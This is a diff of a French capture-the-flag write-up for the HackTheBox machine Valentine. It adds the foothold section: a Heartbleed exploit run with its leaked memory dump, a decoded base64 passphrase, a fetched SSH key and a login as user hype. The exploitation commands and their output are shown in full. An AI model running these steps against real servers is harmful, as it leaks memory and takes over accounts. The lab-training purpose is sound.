@@ -381,15 +381,220 @@ Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdoma
 
 ## Exploitation – Prise pied (Foothold)
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+### Analyse de l'image
 
----
+Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu'une unique page contenant simplement une image, *omg.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d'attaque aussi restreinte, il est logique d'envisager que cette image puisse dissimuler une information utile à la progression. 
+
+Nous commençons donc par la télécharger et l'analyser à l'aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Stéganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
+
+Après avoir appliqué une série de ces techniques en commençant par **stegseek** , nous ne mettons en évidence aucun élément utile, ce qui confirme que **l'image ne constitue pas un vecteur d'exploitation** dans ce cas.
+
+![omg](omg.jpg)
+
+
+
+### Heartbleed
+
+Lors du **scan agressif**, Nmap met en évidence la présence d’une vulnérabilité critique : **[Heartbleed](https://fr.wikipedia.org/wiki/Heartbleed) (littéralement “cœur qui saigne”) – CVE-2014-0160** sur le service TLS. Le nom de la machine — *Valentine* — et l’image d’un **cœur brisé** affichée sur la page web orientent immédiatement vers cette faille célèbre, **découverte le jour de la Saint-Valentin**. Heartbleed touche l’extension TLS Heartbeat et permet à un attaquant de lire arbitrairement des fragments de mémoire du serveur. Tous ces indices convergent et indiquent clairement que l’exploitation de **Heartbleed** constitue le point d’entrée logique pour obtenir le foothold.
+
+- exploitation
+
+[heartbleed.py](https://github.com/injcristianrojas/heartbleed-example/blob/master/heartbleed.py)
+
+```bash
+python2 heartbleed.py
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+Usage: heartbleed.py server [options]
+
+Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+Options:
+  -h, --help            show this help message and exit
+  -p PORT, --port=PORT  TCP port to test (default: 443)
+  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
+  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
+  -f FILEIN, --filein=FILEIN
+                        Specify input file, line delimited, IPs or hostnames
+                        or IP:port or hostname:port
+  -v, --verbose         Enable verbose output
+  -x, --hexdump         Enable hex output
+  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
+                        Dump the raw memory contents to a file
+  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
+                        Dump the ascii contents to a file
+  -d, --donotdisplay    Do not display returned data on screen
+  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
+                        found. Choosing this enables -d, do not display
+                        returned data on screen.
+
+```
+
+
+
+```bash
+python2 heartbleed.py valentine.htb -n 5 
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: valentine.htb:443, 5 times
+Sending Client Hello for TLSv1.0
+Received Server Hello for TLSv1.0
+
+WARNING: valentine.htb:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 5 of 5
+##################################################################
+
+.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==....m...E..u}..a}o.K....................-.....3...........B...5D.y,+..Y...d:..k.TlWH.F......+rt.....["k....!.>..N.y..$..hPv~b.....b.'+,M.e .d.. ]}....(... *...3..aF......:DM.h..<..n..N..CM.P=..?.I.$nB...,;b.L....$...?.K/c....3w{.A.\.q;...Jw...,..C.."[|^....l\m..Q..Q....+..I...(.J.....g)...."......?).%.....k.[............nt"_$5M&...RS.Q\..ENK...1.Uc..4$w......|`...4..pI........:..\.....M....$?........%$.......I."n.R..f.......... V....Bj...Z..J....y&.1..~Q..............H....9[...s.[....x{y...[A..*.N.r:.lRL....l..L.4fK....{]!....I......8..xV..S[)..S3D.j5..wH..XD...d.L...I...e...\...J.z........D.4..9.2w..<0~.^..............L.).7....B....U....Y+7{I>'..9h..D1.....O....5(..G..T}.M[.9.;....75...a.........F.k.w&....I{.........3!.eb..:..D.[9.L...y#..D!......S6.E.^.&...f.\.@.O.&..cl....=P...vy.,[d....b........20.....J$......./....w2R.V.m[.@.zA..%*.j.lD}....|wQ/.$.y._)b7..._._.9....oEn..}%.b.q.h@..L...W.S.v.H..p...cjR.LHx.
+.H......nuQ]NX....`8......C..s..;..ORt2....W:.....i.Wc..J;....!........E}...qP..;[g...Me.....:6....A.T..M...U.V.:7.i....4E..Yg....v4 .c.....`.5y......./,... ........r9.X.A..[.$x<..........Oq.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==Q!.w..-..yX.....p................+............-.....3........_...1..!..ir..AcXRvxe.E".&gRRT.R....t.~Br9....buY.uzQS.*...UjP+.C..c...Q7.Q.d....ghL.U}]e|..k.Y./.v..E..I....0.Btj..x../...:...S....^iyf./9R...V.......JH+3?aR....8..R#J,.6.T.n.B\..,..-I...P...SH 3.oE`j.&BI..o.E..G.Z.|GX..Y..).D.....1.....1..0.P..\.MX6.3a.d......;...(c._.f.j.u.L..k<.HA..........*{.a%N.dwC..H7...-|9...Hf.KL.J.!9(....4X.."..#..h....+..d.o.h.....`.E.*%.>.!.6.t0c.t.c...a.DT......m.f.!L..p..H...$..l.0.....9.Rj.N...A.^..$..7.Zz_1..g.....;s.;y95...Sd..ft..*...
+..5......B..P.
+iB.$...8.....".!Ru.7JO.<....h.32:....)....v{....0..3.F9.....i.
+r..d.$...)...9.p.i..Vi.....XB^.7..v........:1P. V.f.z"..V$.?.)..34fz=.Z......6..UoBa......].mJ.n$....N
+.E...oe.....Q;.#...["....:Nc....-...;.....a.?5..wr....I...?3..A....
+"....T."J....1..kN....."F.J..CC|..P{U....\..A..o....W=~.P.F.......D...b.Z..'v.J...4.nA.``ul...Q...Vc.M...mv...G..".3....r..`OG.@....G...,.G`..{...A.O.=..Y.tWHR.],.9'.4.}.....h.*..dO,...2v......j...ly.GY.8...").....[Y.~..<K."kp..V!\....m.....? 
+....iN,E~.>^...4.u9.,<m...'..t.65.N^z...=.5.<=... ..<..|.....p.yM 6r.....tD.....O_q.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+q.@....SC[...r....+..H...9...0aGVoeXBlCg==..S.w...7.....?v
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==......7..U.T.%.`t.L.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..y.....*....!.!.I.#.............+............-.....3........=..5@t.:.........a...`e@v.!..n....r....te.-1.S\.8.>si/2..tXKo..\...2 .x"...k..Y...'7...&...c......(.s.p......0YV`IM...wjZ....ukJp((W@.*|F[9pKF...;.e[<VQ...|...CV*..e..?)..Xu..Q/;....&......1Xn....../.\u.X.;\..b.&5"4...f=....EU....#f.....8......c...?.z]..R..CC.'u.|...bi...
+......%Oz.mXw.k.D.....c..)H.4.U.....b.U...q[81WD!M.{..E..s...=d...4,..mOA..f...S.bA....z...l..OMyo..D..8...{4.:.B.(.....;.x.....M..$G0..M.....OM.K.8#.....XJ.........k%..BY...03=......cm..c..`+..5.}Y.F...GWS.ji...$\)o.>.'...~.S^..+...].....)......9.P........d.{..>.&1..3G...a....An'..@Z+O.Q."0..J.P....=.r...0cV..+.$..V...sH.[.`t.:|Nz(.6...y.I.55IZt..ZL..IS..f."...Mt..`.{... ...N..u.t:....).........KA..p.n.p*.f..h..c4....'Y
+}..aj... ...,.**...c0f..*....t.G.......8LJ.Pe...............m.DMJ.....Y..z.F...h.....7..!....r..\...;k.3n....e
+.AR..!.....T=x.|P.$".^w..J(.
+6.Q]../.u.(7.....F.P.R.,.M.J...m. ..N.)/J..m.SSp8S.5...t.....$.+].v..!.8>.t...._Iuq.Zf..ebd?Y..r.....k.E....$.W.1.buJ..y..Ej.........V%..
+...>..yP...z5...N..0w.......x ....{....a....;...{[....[a...Q.g..>Zie........
+]+...9..j &.{.|q/.<
+
+
+```
+
+- on retrouve à chaque fois 
+
+```text
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg
+```
+
+qui décodé Base64 donne **heartbleedbelievethehype** qui pourrait bien être un **mot de passe**.
+
+###  hype_key et connexion
+
+![dir-dev](dir_dev.png)
+
+```bash
+curl -o notes.txt http://valentine.htb/dev/notes.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   227  100   227    0     0  10972      0 --:--:-- --:--:-- --:--:-- 10809
+```
+
+```bash
+curl -o hype_key http://valentine.htb/dev/hype_key
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5383  100  5383    0     0   275k      0 --:--:-- --:--:-- --:--:--  276k
+```
+
+- décodage de hype_key hex vers hype_key_decoded dans [cyberchef](https://gchq.github.io/CyberChef/)
+
+![cyberchef_hype_key](cyberchef_hype_key.png)
+
+- création 'copier/coller' dans nano du fichier hype_key_decoded et dans mon cas, copie vers /home/kali/tmp
+
+```bash
+cp .hype_key_decoded/home/kali/tmp
+```
+
+- modifications des permissions en 600 et connexion en tant que utilisateur `hype` (logique puis que la clé est hype_key, la clé de hype) avec la clé `hype_key_decoded` le mot de passe `heartbleedbelievethehype`
+
+```bash
+chmod 600 hype_key_decoded
+
+ssh -i hype_key_decoded hype@valentine.htb
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'hype_key_decoded': 
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+hype@Valentine:~$ 
+```
+
+
+
+### flag user.txt
+
+```bash
+hype@Valentine:~$ ls -l
+total 36
+drwxr-xr-x 2 hype hype 4096 Jul  9 01:46 Desktop
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Documents
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Downloads
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Music
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Pictures
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Public
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Templates
+-rw-rw-r-- 1 hype hype   33 Nov 24 06:46 user.txt
+drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Videos
+
+hype@Valentine:~$ cat user.txt
+ef7xxxxxxxxxxxxxxxxxxxxxxxxxxx24e0
+
+```
+
+
 
 ## Escalade de privilèges
 
 ### Vers utilisateur intermédiaire (si applicable)
+
 - Méthode (sudoers, capabilities, SUID, timers, service vulnérable).
 - Indices collectés (configs, clés, cron, journaux).
 
